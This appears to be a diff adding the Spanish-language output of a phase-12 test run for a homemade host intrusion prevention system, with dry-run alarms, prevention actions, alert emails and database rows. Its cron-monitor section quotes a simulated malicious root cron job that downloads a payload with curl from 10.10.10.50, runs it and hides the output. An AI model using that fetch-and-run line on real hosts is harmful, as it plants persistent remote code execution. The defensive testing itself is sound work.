@@ -1,0 +1,254 @@
+===== FASE 12 - PRUEBAS FINALES HIPS =====
+Fecha: vie 26 jun 2026 13:24:18 -03
+
+===== 1. VERIFICACION DE SINTAXIS PYTHON =====
+Sintaxis Python: OK
+
+===== 2. ACCESS MONITOR =====
+No se detectaron accesos invalidos repetidos.
+
+===== 3. FILE INTEGRITY =====
+Baseline creado: /tmp/hips_fim_phase12_baseline.json
+Archivos registrados: 1
+Prevencion: {'prevented': False, 'file': '/tmp/hips_fim_phase12.txt', 'reason': 'DRY RUN: se restaurarian permisos/propietario segun baseline. Si se usa --real-prevent --lock-files, tambien se aplicaria chattr +i.'}
+{'tipo_alarma': 'ARCHIVO_PROTEGIDO_MODIFICADO', 'ip_origen': 'N/A', 'modulo': 'file_integrity', 'archivo': '/tmp/hips_fim_phase12.txt', 'descripcion': '/tmp/hips_fim_phase12.txt: contenido_modificado', 'baseline': {'exists': True, 'gid': 0, 'mode': '0o640', 'mtime': 1782491059, 'path': '/tmp/hips_fim_phase12.txt', 'sha256': 'e2707d4e26f4b84e338209a33beb0a97e99a6a954365067331a3aa3fc7b2cb9b', 'size': 18, 'uid': 0}, 'actual': {'path': '/tmp/hips_fim_phase12.txt', 'exists': True, 'sha256': '14ad8fc483919c2741964b9269ced4cc5013569fc7c0fd1cb96a7bc9224cb594', 'size': 36, 'mode': '0o640', 'uid': 0, 'gid': 0, 'mtime': 1782491059}, 'motivos': ['contenido_modificado']}
+
+===== 4. USERS MONITOR =====
+Prevencion: {'locked': False, 'user': 'intruso', 'reason': 'Usuario no existe en el sistema: intruso'}
+{'tipo_alarma': 'USUARIO_NO_AUTORIZADO_CONECTADO', 'ip_origen': '10.10.10.50', 'modulo': 'users_monitor', 'usuario': 'intruso', 'descripcion': 'Usuario conectado no autorizado: intruso', 'session': {'user': 'intruso', 'tty': 'pts/2', 'date': '2026-06-26', 'time': '13:10', 'origin': '10.10.10.50', 'raw': 'intruso pts/2 2026-06-26 13:10 (10.10.10.50)'}}
+Prevencion: {'locked': False, 'user': 'intruso', 'reason': 'Usuario no existe en el sistema: intruso'}
+{'tipo_alarma': 'ORIGEN_USUARIO_INUSUAL', 'ip_origen': '10.10.10.50', 'modulo': 'users_monitor', 'usuario': 'intruso', 'descripcion': 'Origen inusual para usuario intruso: 10.10.10.50', 'session': {'user': 'intruso', 'tty': 'pts/2', 'date': '2026-06-26', 'time': '13:10', 'origin': '10.10.10.50', 'raw': 'intruso pts/2 2026-06-26 13:10 (10.10.10.50)'}}
+
+===== 5. SNIFFER DETECT =====
+Prevencion: {'killed': False, 'pid': '1234', 'process': 'tcpdump', 'reason': 'DRY RUN: se terminaria proceso sniffer tcpdump con PID 1234'}
+{'tipo_alarma': 'SNIFFER_DETECTADO', 'ip_origen': 'N/A', 'modulo': 'sniffer_detect', 'pid': '1234', 'proceso': 'tcpdump', 'descripcion': 'Herramienta de captura detectada: tcpdump PID 1234', 'raw': '1234 tcpdump tcpdump -i enp0s3 -n'}
+Prevencion: {'killed': False, 'pid': '3456', 'process': 'wireshark', 'reason': 'DRY RUN: se terminaria proceso sniffer wireshark con PID 3456'}
+{'tipo_alarma': 'SNIFFER_DETECTADO', 'ip_origen': 'N/A', 'modulo': 'sniffer_detect', 'pid': '3456', 'proceso': 'wireshark', 'descripcion': 'Herramienta de captura detectada: wireshark PID 3456', 'raw': '3456 wireshark wireshark'}
+Prevencion: {'disabled': False, 'interface': 'enp0s3', 'reason': 'DRY RUN: se desactivaria modo promiscuo en interfaz enp0s3'}
+{'tipo_alarma': 'MODO_PROMISCUO_DETECTADO', 'ip_origen': 'N/A', 'modulo': 'sniffer_detect', 'interfaz': 'enp0s3', 'descripcion': 'Interfaz en modo promiscuo: enp0s3', 'raw': '2: enp0s3: <BROADCAST,MULTICAST,PROMISC,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP mode DEFAULT group default qlen 1000'}
+
+===== 6. LOG ANALYZER =====
+Prevencion: {'blocked': False, 'ip': '10.10.10.51', 'reason': 'DRY RUN: se bloquearia la IP 10.10.10.51', 'command': "firewall-cmd --permanent --add-rich-rule rule family='ipv4' source address='10.10.10.51' reject"}
+{'tipo_alarma': 'LOG_AUTH_ABUSO', 'ip_origen': '10.10.10.51', 'modulo': 'log_analyzer', 'descripcion': '5 fallos de autenticacion en 10 minutos', 'accion_preventiva': 'block_ip'}
+Prevencion: {'blocked': False, 'ip': '10.10.10.51', 'reason': 'DRY RUN: se bloquearia la IP 10.10.10.51', 'command': "firewall-cmd --permanent --add-rich-rule rule family='ipv4' source address='10.10.10.51' reject"}
+{'tipo_alarma': 'CREDENTIAL_STUFFING_DETECTADO', 'ip_origen': '10.10.10.51', 'modulo': 'log_analyzer', 'descripcion': 'Intentos con multiples usuarios desde una misma IP: admin, oracle, postgres', 'accion_preventiva': 'block_ip'}
+Prevencion: {'blocked': False, 'ip': '10.10.10.60', 'reason': 'DRY RUN: se bloquearia la IP 10.10.10.60', 'command': "firewall-cmd --permanent --add-rich-rule rule family='ipv4' source address='10.10.10.60' reject"}
+{'tipo_alarma': 'POSIBLE_SCANNER_HTTP', 'ip_origen': '10.10.10.60', 'modulo': 'log_analyzer', 'descripcion': '5 errores HTTP desde la misma IP. Posible scanner web.', 'accion_preventiva': 'block_ip'}
+Prevencion: {'locked': False, 'user': 'spamuser', 'reason': 'Usuario no existe en el sistema: spamuser'}
+{'tipo_alarma': 'ENVIO_MASIVO_MAILS', 'ip_origen': 'N/A', 'modulo': 'log_analyzer', 'usuario': 'spamuser', 'cuenta': 'spamuser@example.com', 'descripcion': 'Cuenta con posible envio masivo de correo: spamuser@example.com (5 eventos)', 'accion_preventiva': 'mail_user_action'}
+
+===== 7. PROCESS MONITOR =====
+Prevencion: {'terminated': False, 'pid': '1234', 'process': 'suspicious', 'user': 'nobody', 'reason': 'DRY RUN: se terminaria proceso suspicious PID 1234'}
+{'tipo_alarma': 'PROCESO_ALTO_CONSUMO', 'ip_origen': 'N/A', 'modulo': 'process_monitor', 'pid': '1234', 'usuario': 'nobody', 'proceso': 'suspicious', 'memoria': 85.5, 'duracion_segundos': 0, 'descripcion': 'Proceso suspicious PID 1234 consume 85.5% de memoria durante 0 segundos', 'raw': '1234 nobody suspicious 85.5 00:05:00 /tmp/suspicious --work'}
+Prevencion: {'terminated': False, 'pid': '3456', 'process': 'miner', 'user': 'nobody', 'reason': 'DRY RUN: se terminaria proceso miner PID 3456'}
+{'tipo_alarma': 'PROCESO_ALTO_CONSUMO', 'ip_origen': 'N/A', 'modulo': 'process_monitor', 'pid': '3456', 'usuario': 'nobody', 'proceso': 'miner', 'memoria': 92.0, 'duracion_segundos': 0, 'descripcion': 'Proceso miner PID 3456 consume 92.0% de memoria durante 0 segundos', 'raw': '3456 nobody miner 92.0 00:10:00 /tmp/miner'}
+
+===== 8. TMP MONITOR =====
+Prevencion: {'quarantined': False, 'file': '/tmp/hips_tmp_phase12/.xpayload123.sh', 'reason': 'DRY RUN: se moveria a cuarentena /tmp/hips_tmp_phase12/.xpayload123.sh'}
+{'tipo_alarma': 'ARCHIVO_TMP_SOSPECHOSO', 'ip_origen': 'N/A', 'modulo': 'tmp_monitor', 'archivo': '/tmp/hips_tmp_phase12/.xpayload123.sh', 'descripcion': 'Archivo sospechoso en /tmp: /tmp/hips_tmp_phase12/.xpayload123.sh. Motivos: archivo_ejecutable_en_tmp, script_o_binario_ejecutable_extension=.sh, script_con_shebang_ejecutable, nombre_sospechoso', 'motivos': ['archivo_ejecutable_en_tmp', 'script_o_binario_ejecutable_extension=.sh', 'script_con_shebang_ejecutable', 'nombre_sospechoso']}
+Prevencion: {'process': {'terminated': False, 'pid': '4444', 'process': 'suspicious', 'user': 'nobody', 'reason': 'DRY RUN: se terminaria proceso suspicious PID 4444'}, 'file': {'quarantined': False, 'file': '/tmp/hips_tmp_phase12/.xpayload123.sh', 'reason': 'DRY RUN: se moveria a cuarentena /tmp/hips_tmp_phase12/.xpayload123.sh'}}
+{'tipo_alarma': 'PROCESO_TMP_SOSPECHOSO', 'ip_origen': 'N/A', 'modulo': 'tmp_monitor', 'pid': '4444', 'usuario': 'nobody', 'proceso': 'suspicious', 'archivo': '/tmp/hips_tmp_phase12/.xpayload123.sh', 'descripcion': 'Proceso ejecutandose desde /tmp: PID 4444, usuario nobody, comando /tmp/hips_tmp_phase12/.xpayload123.sh', 'raw': '4444 nobody suspicious /tmp/hips_tmp_phase12/.xpayload123.sh'}
+
+===== 9. CRON MONITOR =====
+Prevencion: {'disabled': False, 'file': '/tmp/cron_phase12/payload_job', 'reason': 'DRY RUN: se moveria cron sospechoso a cuarentena: /tmp/cron_phase12/payload_job'}
+{'tipo_alarma': 'CRON_ARCHIVO_SOSPECHOSO', 'ip_origen': 'N/A', 'modulo': 'cron_monitor', 'archivo': '/tmp/cron_phase12/payload_job', 'linea': 'N/A', 'descripcion': 'Archivo cron sospechoso: /tmp/cron_phase12/payload_job. Motivos: nombre_de_archivo_cron_sospechoso', 'motivos': ['nombre_de_archivo_cron_sospechoso']}
+Prevencion: {'disabled': False, 'file': '/tmp/cron_phase12/payload_job', 'reason': 'DRY RUN: se moveria cron sospechoso a cuarentena: /tmp/cron_phase12/payload_job'}
+{'tipo_alarma': 'CRON_TAREA_SOSPECHOSA', 'ip_origen': 'N/A', 'modulo': 'cron_monitor', 'archivo': '/tmp/cron_phase12/payload_job', 'linea': 1, 'descripcion': 'Tarea cron sospechosa en /tmp/cron_phase12/payload_job:1. Motivos: comando_o_ruta_sospechosa, ejecucion_desde_directorio_temporal, oculta_salida_de_comando_sospechoso, descarga_remota_programada. Contenido: * * * * * root curl http://10.10.10.50/payload.sh -o /tmp/payload.sh && chmod +x /tmp/payload.sh && /tmp/payload.sh >/dev/null 2>&1', 'motivos': ['comando_o_ruta_sospechosa', 'ejecucion_desde_directorio_temporal', 'oculta_salida_de_comando_sospechoso', 'descarga_remota_programada'], 'contenido': '* * * * * root curl http://10.10.10.50/payload.sh -o /tmp/payload.sh && chmod +x /tmp/payload.sh && /tmp/payload.sh >/dev/null 2>&1'}
+
+===== 10. DDOS DETECT =====
+Prevencion: {'blocked': False, 'ip': '10.10.10.80', 'reason': 'DRY RUN: se bloquearia la IP 10.10.10.80', 'command': "firewall-cmd --permanent --add-rich-rule rule family='ipv4' source address='10.10.10.80' reject"}
+{'tipo_alarma': 'DDOS_DNS_IP_ALTA_FRECUENCIA', 'ip_origen': '10.10.10.80', 'modulo': 'ddos_detect', 'descripcion': '5 eventos DNS desde 10.10.10.80 en 60 segundos', 'accion_preventiva': 'block_ip'}
+Prevencion: {'blocked': False, 'ip': '10.10.10.90', 'reason': 'DRY RUN: se bloquearia la IP 10.10.10.90', 'command': "firewall-cmd --permanent --add-rich-rule rule family='ipv4' source address='10.10.10.90' reject"}
+{'tipo_alarma': 'DDOS_DNS_IP_ALTA_FRECUENCIA', 'ip_origen': '10.10.10.90', 'modulo': 'ddos_detect', 'descripcion': '5 eventos DNS desde 10.10.10.90 en 60 segundos', 'accion_preventiva': 'block_ip'}
+Prevencion: {'blocked': False, 'ip': '10.10.10.90', 'reason': 'DRY RUN: se bloquearia la IP 10.10.10.90', 'command': "firewall-cmd --permanent --add-rich-rule rule family='ipv4' source address='10.10.10.90' reject"}
+{'tipo_alarma': 'DDOS_DNS_ANY_FLOOD', 'ip_origen': '10.10.10.90', 'modulo': 'ddos_detect', 'descripcion': '5 consultas DNS tipo ANY desde 10.10.10.90 en 60 segundos', 'accion_preventiva': 'block_ip'}
+Prevencion: {'service_action': 'stop_service', 'service': 'named', 'dry_run': True}
+{'tipo_alarma': 'DDOS_DNS_DISTRIBUIDO', 'ip_origen': 'N/A', 'modulo': 'ddos_detect', 'descripcion': '10 eventos DNS totales en 60 segundos. Posible DDoS distribuido.', 'accion_preventiva': 'stop_dns_service'}
+
+===== 11. MAIL QUEUE =====
+Prevencion: {'service_action': 'stop_postfix', 'dry_run': True}
+{'tipo_alarma': 'MAIL_QUEUE_ALTA', 'ip_origen': 'N/A', 'modulo': 'mail_queue', 'descripcion': 'Cola de correo elevada: 7 mensajes pendientes', 'total_mensajes': 7, 'total_kb': 14, 'accion_preventiva': 'stop_mail_service'}
+Prevencion: {'locked': False, 'user': 'spamuser', 'reason': 'Usuario no existe en el sistema: spamuser'}
+{'tipo_alarma': 'MAIL_QUEUE_USUARIO_SOSPECHOSO', 'ip_origen': 'N/A', 'modulo': 'mail_queue', 'usuario': 'spamuser', 'cuenta': 'spamuser@example.com', 'descripcion': 'Cuenta con muchos mensajes en cola: spamuser@example.com (5 mensajes)', 'total_mensajes': 5, 'accion_preventiva': 'mail_user_action'}
+
+===== 12. ULTIMAS ALARMAS EN LOG =====
+26/06/2026 11:22:26 :: CRON_TAREA_SOSPECHOSA :: N/A
+26/06/2026 11:26:14 :: DDOS_DNS_IP_ALTA_FRECUENCIA :: 10.10.10.80
+26/06/2026 11:26:14 :: DDOS_DNS_IP_ALTA_FRECUENCIA :: 10.10.10.90
+26/06/2026 11:26:14 :: DDOS_DNS_ANY_FLOOD :: 10.10.10.90
+26/06/2026 11:26:14 :: DDOS_DNS_DISTRIBUIDO :: N/A
+26/06/2026 11:26:31 :: DDOS_DNS_IP_ALTA_FRECUENCIA :: 10.10.10.80
+26/06/2026 11:26:31 :: DDOS_DNS_IP_ALTA_FRECUENCIA :: 10.10.10.90
+26/06/2026 11:26:31 :: DDOS_DNS_ANY_FLOOD :: 10.10.10.90
+26/06/2026 11:26:31 :: DDOS_DNS_DISTRIBUIDO :: N/A
+26/06/2026 11:28:16 :: MAIL_QUEUE_USUARIO_SOSPECHOSO :: N/A
+26/06/2026 11:30:14 :: MAIL_QUEUE_ALTA :: N/A
+26/06/2026 11:30:14 :: MAIL_QUEUE_USUARIO_SOSPECHOSO :: N/A
+26/06/2026 11:30:25 :: MAIL_QUEUE_ALTA :: N/A
+26/06/2026 11:30:25 :: MAIL_QUEUE_USUARIO_SOSPECHOSO :: N/A
+26/06/2026 12:06:48 :: TEST_DB_ALARMA :: 10.10.10.10
+26/06/2026 12:08:44 :: MAIL_QUEUE_ALTA :: N/A
+26/06/2026 12:08:44 :: MAIL_QUEUE_USUARIO_SOSPECHOSO :: N/A
+26/06/2026 12:57:51 :: TEST_CIS_POSTGRESQL :: 127.0.0.1
+26/06/2026 13:24:19 :: ARCHIVO_PROTEGIDO_MODIFICADO :: N/A
+26/06/2026 13:24:19 :: USUARIO_NO_AUTORIZADO_CONECTADO :: 10.10.10.50
+26/06/2026 13:24:19 :: ORIGEN_USUARIO_INUSUAL :: 10.10.10.50
+26/06/2026 13:24:19 :: SNIFFER_DETECTADO :: N/A
+26/06/2026 13:24:19 :: SNIFFER_DETECTADO :: N/A
+26/06/2026 13:24:19 :: MODO_PROMISCUO_DETECTADO :: N/A
+26/06/2026 13:24:20 :: LOG_AUTH_ABUSO :: 10.10.10.51
+26/06/2026 13:24:20 :: CREDENTIAL_STUFFING_DETECTADO :: 10.10.10.51
+26/06/2026 13:24:20 :: POSIBLE_SCANNER_HTTP :: 10.10.10.60
+26/06/2026 13:24:20 :: ENVIO_MASIVO_MAILS :: N/A
+26/06/2026 13:24:20 :: PROCESO_ALTO_CONSUMO :: N/A
+26/06/2026 13:24:20 :: PROCESO_ALTO_CONSUMO :: N/A
+26/06/2026 13:24:20 :: ARCHIVO_TMP_SOSPECHOSO :: N/A
+26/06/2026 13:24:20 :: PROCESO_TMP_SOSPECHOSO :: N/A
+26/06/2026 13:24:20 :: CRON_ARCHIVO_SOSPECHOSO :: N/A
+26/06/2026 13:24:20 :: CRON_TAREA_SOSPECHOSA :: N/A
+26/06/2026 13:24:21 :: DDOS_DNS_IP_ALTA_FRECUENCIA :: 10.10.10.80
+26/06/2026 13:24:21 :: DDOS_DNS_IP_ALTA_FRECUENCIA :: 10.10.10.90
+26/06/2026 13:24:21 :: DDOS_DNS_ANY_FLOOD :: 10.10.10.90
+26/06/2026 13:24:21 :: DDOS_DNS_DISTRIBUIDO :: N/A
+26/06/2026 13:24:21 :: MAIL_QUEUE_ALTA :: N/A
+26/06/2026 13:24:21 :: MAIL_QUEUE_USUARIO_SOSPECHOSO :: N/A
+
+===== 13. ULTIMAS PREVENCIONES EN LOG =====
+26/06/2026 04:08:14 :: ENVIO_MASIVO_MAILS :: N/A :: lock_user :: Usuario no existe en el sistema: spamuser
+26/06/2026 04:20:22 :: PROCESO_ALTO_CONSUMO :: N/A :: terminate_process :: DRY RUN: se terminaria proceso suspicious PID 1234
+26/06/2026 04:20:22 :: PROCESO_ALTO_CONSUMO :: N/A :: terminate_process :: DRY RUN: se terminaria proceso miner PID 3456
+26/06/2026 04:25:59 :: ARCHIVO_TMP_SOSPECHOSO :: N/A :: quarantine_file :: DRY RUN: se moveria a cuarentena /tmp/hips_tmp_testdir/.xpayload123.sh
+26/06/2026 04:25:59 :: PROCESO_TMP_SOSPECHOSO :: N/A :: terminate_process :: DRY RUN: se terminaria proceso suspicious PID 4444
+26/06/2026 04:25:59 :: PROCESO_TMP_SOSPECHOSO :: N/A :: quarantine_file :: DRY RUN: se moveria a cuarentena /tmp/hips_tmp_testdir/.xpayload123.sh
+26/06/2026 11:22:26 :: CRON_ARCHIVO_SOSPECHOSO :: N/A :: disable_cron_file :: DRY RUN: se moveria cron sospechoso a cuarentena: /tmp/cron_test/payload_job
+26/06/2026 11:22:26 :: CRON_TAREA_SOSPECHOSA :: N/A :: disable_cron_file :: DRY RUN: se moveria cron sospechoso a cuarentena: /tmp/cron_test/payload_job
+26/06/2026 11:26:31 :: DDOS_DNS_IP_ALTA_FRECUENCIA :: 10.10.10.80 :: block_ip :: DRY RUN: se bloquearia la IP 10.10.10.80
+26/06/2026 11:26:31 :: DDOS_DNS_IP_ALTA_FRECUENCIA :: 10.10.10.90 :: block_ip :: DRY RUN: se bloquearia la IP 10.10.10.90
+26/06/2026 11:26:31 :: DDOS_DNS_ANY_FLOOD :: 10.10.10.90 :: block_ip :: DRY RUN: se bloquearia la IP 10.10.10.90
+26/06/2026 11:26:31 :: DDOS_DNS_DISTRIBUIDO :: N/A :: stop_service :: DRY RUN: se detendria el servicio named
+26/06/2026 11:30:25 :: MAIL_QUEUE_ALTA :: N/A :: stop_service :: DRY RUN: se detendria el servicio postfix
+26/06/2026 11:30:25 :: MAIL_QUEUE_USUARIO_SOSPECHOSO :: N/A :: lock_user :: Usuario no existe en el sistema: spamuser
+26/06/2026 12:06:48 :: TEST_DB_ALARMA :: 10.10.10.10 :: test_action :: accion de prueba
+26/06/2026 12:08:44 :: MAIL_QUEUE_ALTA :: N/A :: stop_service :: DRY RUN: se detendria el servicio postfix
+26/06/2026 12:08:44 :: MAIL_QUEUE_USUARIO_SOSPECHOSO :: N/A :: lock_user :: Usuario no existe en el sistema: spamuser
+26/06/2026 13:24:19 :: ARCHIVO_PROTEGIDO_MODIFICADO :: N/A :: file_integrity_prevention :: DRY RUN: se restaurarian permisos/propietario segun baseline. Si se usa --real-prevent --lock-files, tambien se aplicaria chattr +i.
+26/06/2026 13:24:19 :: USUARIO_NO_AUTORIZADO_CONECTADO :: N/A :: lock_user :: Usuario no existe en el sistema: intruso
+26/06/2026 13:24:19 :: ORIGEN_USUARIO_INUSUAL :: N/A :: lock_user :: Usuario no existe en el sistema: intruso
+26/06/2026 13:24:19 :: SNIFFER_DETECTADO :: N/A :: kill_sniffer_process :: DRY RUN: se terminaria proceso sniffer tcpdump con PID 1234
+26/06/2026 13:24:19 :: SNIFFER_DETECTADO :: N/A :: kill_sniffer_process :: DRY RUN: se terminaria proceso sniffer wireshark con PID 3456
+26/06/2026 13:24:19 :: MODO_PROMISCUO_DETECTADO :: N/A :: disable_promiscuous_mode :: DRY RUN: se desactivaria modo promiscuo en interfaz enp0s3
+26/06/2026 13:24:20 :: LOG_AUTH_ABUSO :: 10.10.10.51 :: block_ip :: DRY RUN: se bloquearia la IP 10.10.10.51
+26/06/2026 13:24:20 :: CREDENTIAL_STUFFING_DETECTADO :: 10.10.10.51 :: block_ip :: DRY RUN: se bloquearia la IP 10.10.10.51
+26/06/2026 13:24:20 :: POSIBLE_SCANNER_HTTP :: 10.10.10.60 :: block_ip :: DRY RUN: se bloquearia la IP 10.10.10.60
+26/06/2026 13:24:20 :: ENVIO_MASIVO_MAILS :: N/A :: lock_user :: Usuario no existe en el sistema: spamuser
+26/06/2026 13:24:20 :: PROCESO_ALTO_CONSUMO :: N/A :: terminate_process :: DRY RUN: se terminaria proceso suspicious PID 1234
+26/06/2026 13:24:20 :: PROCESO_ALTO_CONSUMO :: N/A :: terminate_process :: DRY RUN: se terminaria proceso miner PID 3456
+26/06/2026 13:24:20 :: ARCHIVO_TMP_SOSPECHOSO :: N/A :: quarantine_file :: DRY RUN: se moveria a cuarentena /tmp/hips_tmp_phase12/.xpayload123.sh
+26/06/2026 13:24:20 :: PROCESO_TMP_SOSPECHOSO :: N/A :: terminate_process :: DRY RUN: se terminaria proceso suspicious PID 4444
+26/06/2026 13:24:20 :: PROCESO_TMP_SOSPECHOSO :: N/A :: quarantine_file :: DRY RUN: se moveria a cuarentena /tmp/hips_tmp_phase12/.xpayload123.sh
+26/06/2026 13:24:20 :: CRON_ARCHIVO_SOSPECHOSO :: N/A :: disable_cron_file :: DRY RUN: se moveria cron sospechoso a cuarentena: /tmp/cron_phase12/payload_job
+26/06/2026 13:24:20 :: CRON_TAREA_SOSPECHOSA :: N/A :: disable_cron_file :: DRY RUN: se moveria cron sospechoso a cuarentena: /tmp/cron_phase12/payload_job
+26/06/2026 13:24:21 :: DDOS_DNS_IP_ALTA_FRECUENCIA :: 10.10.10.80 :: block_ip :: DRY RUN: se bloquearia la IP 10.10.10.80
+26/06/2026 13:24:21 :: DDOS_DNS_IP_ALTA_FRECUENCIA :: 10.10.10.90 :: block_ip :: DRY RUN: se bloquearia la IP 10.10.10.90
+26/06/2026 13:24:21 :: DDOS_DNS_ANY_FLOOD :: 10.10.10.90 :: block_ip :: DRY RUN: se bloquearia la IP 10.10.10.90
+26/06/2026 13:24:21 :: DDOS_DNS_DISTRIBUIDO :: N/A :: stop_service :: DRY RUN: se detendria el servicio named
+26/06/2026 13:24:21 :: MAIL_QUEUE_ALTA :: N/A :: stop_service :: DRY RUN: se detendria el servicio postfix
+26/06/2026 13:24:21 :: MAIL_QUEUE_USUARIO_SOSPECHOSO :: N/A :: lock_user :: Usuario no existe en el sistema: spamuser
+
+===== 14. ULTIMOS EMAILS GENERADOS =====
+26/06/2026 13:24:20 :: TO=admin@example.com :: SUBJECT=[HIPS PREVENCION] ARCHIVO_TMP_SOSPECHOSO :: BODY=DRY RUN: se moveria a cuarentena /tmp/hips_tmp_phase12/.xpayload123.sh
+26/06/2026 13:24:20 :: TO=admin@example.com :: SUBJECT=[HIPS ALERTA] PROCESO_TMP_SOSPECHOSO :: BODY=Modulo: tmp_monitor
+Detalle: Proceso ejecutandose desde /tmp: PID 4444, usuario nobody, comando /tmp/hips_tmp_phase12/.xpayload123.sh
+Archivo: /tmp/hips_tmp_phase12/.xpayload123.sh
+26/06/2026 13:24:20 :: TO=admin@example.com :: SUBJECT=[HIPS PREVENCION] PROCESO_TMP_SOSPECHOSO :: BODY=DRY RUN: se terminaria proceso suspicious PID 4444
+26/06/2026 13:24:20 :: TO=admin@example.com :: SUBJECT=[HIPS PREVENCION] PROCESO_TMP_SOSPECHOSO :: BODY=DRY RUN: se moveria a cuarentena /tmp/hips_tmp_phase12/.xpayload123.sh
+26/06/2026 13:24:20 :: TO=admin@example.com :: SUBJECT=[HIPS ALERTA] CRON_ARCHIVO_SOSPECHOSO :: BODY=Modulo: cron_monitor
+Archivo: /tmp/cron_phase12/payload_job
+Linea: N/A
+Detalle: Archivo cron sospechoso: /tmp/cron_phase12/payload_job. Motivos: nombre_de_archivo_cron_sospechoso
+26/06/2026 13:24:20 :: TO=admin@example.com :: SUBJECT=[HIPS PREVENCION] CRON_ARCHIVO_SOSPECHOSO :: BODY=DRY RUN: se moveria cron sospechoso a cuarentena: /tmp/cron_phase12/payload_job
+26/06/2026 13:24:20 :: TO=admin@example.com :: SUBJECT=[HIPS ALERTA] CRON_TAREA_SOSPECHOSA :: BODY=Modulo: cron_monitor
+Archivo: /tmp/cron_phase12/payload_job
+Linea: 1
+Detalle: Tarea cron sospechosa en /tmp/cron_phase12/payload_job:1. Motivos: comando_o_ruta_sospechosa, ejecucion_desde_directorio_temporal, oculta_salida_de_comando_sospechoso, descarga_remota_programada. Contenido: * * * * * root curl http://10.10.10.50/payload.sh -o /tmp/payload.sh && chmod +x /tmp/payload.sh && /tmp/payload.sh >/dev/null 2>&1
+26/06/2026 13:24:21 :: TO=admin@example.com :: SUBJECT=[HIPS PREVENCION] CRON_TAREA_SOSPECHOSA :: BODY=DRY RUN: se moveria cron sospechoso a cuarentena: /tmp/cron_phase12/payload_job
+26/06/2026 13:24:21 :: TO=admin@example.com :: SUBJECT=[HIPS ALERTA] DDOS_DNS_IP_ALTA_FRECUENCIA :: BODY=Modulo: ddos_detect
+IP: 10.10.10.80
+Detalle: 5 eventos DNS desde 10.10.10.80 en 60 segundos
+26/06/2026 13:24:21 :: TO=admin@example.com :: SUBJECT=[HIPS PREVENCION] DDOS_DNS_IP_ALTA_FRECUENCIA :: BODY=DRY RUN: se bloquearia la IP 10.10.10.80
+26/06/2026 13:24:21 :: TO=admin@example.com :: SUBJECT=[HIPS ALERTA] DDOS_DNS_IP_ALTA_FRECUENCIA :: BODY=Modulo: ddos_detect
+IP: 10.10.10.90
+Detalle: 5 eventos DNS desde 10.10.10.90 en 60 segundos
+26/06/2026 13:24:21 :: TO=admin@example.com :: SUBJECT=[HIPS PREVENCION] DDOS_DNS_IP_ALTA_FRECUENCIA :: BODY=DRY RUN: se bloquearia la IP 10.10.10.90
+26/06/2026 13:24:21 :: TO=admin@example.com :: SUBJECT=[HIPS ALERTA] DDOS_DNS_ANY_FLOOD :: BODY=Modulo: ddos_detect
+IP: 10.10.10.90
+Detalle: 5 consultas DNS tipo ANY desde 10.10.10.90 en 60 segundos
+26/06/2026 13:24:21 :: TO=admin@example.com :: SUBJECT=[HIPS PREVENCION] DDOS_DNS_ANY_FLOOD :: BODY=DRY RUN: se bloquearia la IP 10.10.10.90
+26/06/2026 13:24:21 :: TO=admin@example.com :: SUBJECT=[HIPS ALERTA] DDOS_DNS_DISTRIBUIDO :: BODY=Modulo: ddos_detect
+IP: N/A
+Detalle: 10 eventos DNS totales en 60 segundos. Posible DDoS distribuido.
+26/06/2026 13:24:21 :: TO=admin@example.com :: SUBJECT=[HIPS PREVENCION] DDOS_DNS_DISTRIBUIDO :: BODY=DRY RUN: se detendria el servicio named
+26/06/2026 13:24:21 :: TO=admin@example.com :: SUBJECT=[HIPS ALERTA] MAIL_QUEUE_ALTA :: BODY=Modulo: mail_queue
+IP: N/A
+Detalle: Cola de correo elevada: 7 mensajes pendientes
+26/06/2026 13:24:21 :: TO=admin@example.com :: SUBJECT=[HIPS PREVENCION] MAIL_QUEUE_ALTA :: BODY=DRY RUN: se detendria el servicio postfix
+26/06/2026 13:24:21 :: TO=admin@example.com :: SUBJECT=[HIPS ALERTA] MAIL_QUEUE_USUARIO_SOSPECHOSO :: BODY=Modulo: mail_queue
+IP: N/A
+Detalle: Cuenta con muchos mensajes en cola: spamuser@example.com (5 mensajes)
+26/06/2026 13:24:21 :: TO=admin@example.com :: SUBJECT=[HIPS PREVENCION] MAIL_QUEUE_USUARIO_SOSPECHOSO :: BODY=Usuario no existe en el sistema: spamuser
+
+===== 15. ULTIMAS ALARMAS EN POSTGRESQL =====
+could not change directory to "/home/hector/hips-project": Permiso denegado
+ id |         timestamp          |          tipo_alarma          |  ip_origen  | modulo 
+----+----------------------------+-------------------------------+-------------+--------
+ 26 | 2026-06-26 13:24:21.477162 | MAIL_QUEUE_USUARIO_SOSPECHOSO | N/A         | hips
+ 25 | 2026-06-26 13:24:21.438955 | MAIL_QUEUE_ALTA               | N/A         | hips
+ 24 | 2026-06-26 13:24:21.266562 | DDOS_DNS_DISTRIBUIDO          | N/A         | hips
+ 23 | 2026-06-26 13:24:21.22705  | DDOS_DNS_ANY_FLOOD            | 10.10.10.90 | hips
+ 22 | 2026-06-26 13:24:21.188087 | DDOS_DNS_IP_ALTA_FRECUENCIA   | 10.10.10.90 | hips
+ 21 | 2026-06-26 13:24:21.150016 | DDOS_DNS_IP_ALTA_FRECUENCIA   | 10.10.10.80 | hips
+ 20 | 2026-06-26 13:24:20.976576 | CRON_TAREA_SOSPECHOSA         | N/A         | hips
+ 19 | 2026-06-26 13:24:20.939409 | CRON_ARCHIVO_SOSPECHOSO       | N/A         | hips
+ 18 | 2026-06-26 13:24:20.722755 | PROCESO_TMP_SOSPECHOSO        | N/A         | hips
+ 17 | 2026-06-26 13:24:20.683973 | ARCHIVO_TMP_SOSPECHOSO        | N/A         | hips
+ 16 | 2026-06-26 13:24:20.488545 | PROCESO_ALTO_CONSUMO          | N/A         | hips
+ 15 | 2026-06-26 13:24:20.450745 | PROCESO_ALTO_CONSUMO          | N/A         | hips
+ 14 | 2026-06-26 13:24:20.268546 | ENVIO_MASIVO_MAILS            | N/A         | hips
+ 13 | 2026-06-26 13:24:20.228333 | POSIBLE_SCANNER_HTTP          | 10.10.10.60 | hips
+ 12 | 2026-06-26 13:24:20.191537 | CREDENTIAL_STUFFING_DETECTADO | 10.10.10.51 | hips
+ 11 | 2026-06-26 13:24:20.152597 | LOG_AUTH_ABUSO                | 10.10.10.51 | hips
+ 10 | 2026-06-26 13:24:19.968313 | MODO_PROMISCUO_DETECTADO      | N/A         | hips
+  9 | 2026-06-26 13:24:19.930203 | SNIFFER_DETECTADO             | N/A         | hips
